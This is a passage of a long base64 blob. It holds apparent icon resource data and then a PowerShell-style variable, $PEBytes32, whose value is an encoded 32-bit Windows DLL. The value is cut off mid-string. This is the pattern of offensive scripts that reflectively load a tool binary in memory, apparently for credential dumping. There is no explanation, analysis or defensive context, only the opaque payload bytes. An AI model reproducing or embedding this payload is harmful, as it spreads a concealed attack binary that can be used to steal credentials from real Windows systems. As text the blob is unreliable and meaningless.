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aKtwq3irgKuIq5CrmKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsuKzArMis0KzorPCs+KwArQitEK0YrSCtKK0wrTitWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Arsiu0K7YruCu6K7wrviuAK8IryCvQK9gr4CviK+gr6ivwK/Ir9Cv2K/gr+iv8K8AAADAAQBcAgAACKAgoCigMKA4oECgSKBQoFigYKBooHCgeKCAoIigoKC4oMCgyKDYoPCg+KAAoQihEKEYoSChKKEwoTihQKFIoVChWKFgoWihcKF4oYChiKGQoZihoKG4odCh2KHgoeih8KH4oQCiCKIQohiiIKIoojCiOKJAokiiUKJYomCiaKJwoniigKKIopCimKKgoqiisKK4osCiyKLQotii4KLoovCi+KIAowijEKMoo0CjSKNQo1ijYKN4o5CjmKOgo6ijsKO4o8CjyKPQo9ij4KP4oxCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSgpKikwKTIpNCk2KTgpPikEKUYpSClKKUwpTilQKVIpVClWKVgpWilAKYQphimIKYwpjimUKZYpnCmeKaAppCmmKagprCmuKbAptCm2KbwpvimEKcYpzCnOKdQp1incKd4p5CnmKewp7in0KfYp/Cn+KcAqAioEKgYqCCoKKgwqDioUKhwqHiogKiIqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipIKkoqTCpQKlQqWCpcKmAqZCpoKmwqcCpyKnQqdip4KnoqfCp+KkAqgiqEKoYqiCqKKowqjiqQKpIqlCqWKpgqmiqcKp4qoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsuKzArMis2KzgrOisAAAA0AIApAAAABCgGKAooCCjKKM4o4Cj0KMgpGCkaKR4pMCkAKUIpRilgKXQpSCmYKZopnimsKa4psimEKdQp1inaKeYp6CnqKfApxCoYKigqLioMKmAqdCpIKpwqrCqyKoAqwirGKtwq8CrEKxgrLCsAK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitCK4QroCukK7QruCuIK8wr3CvgK8AAADgAgC4AAAAEKAgoGCgcKCwoMCgAKEQoUChSKFQoVihYKFooXChoKGwoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJwooCiwKLQohCjIKOgo7Cj8KMApECkUKTApNCkEKUgpWClsKUApnCmgKbAptCmEKcgp1inkKeYp6CnqKewp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHioAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $PEBytes32 = "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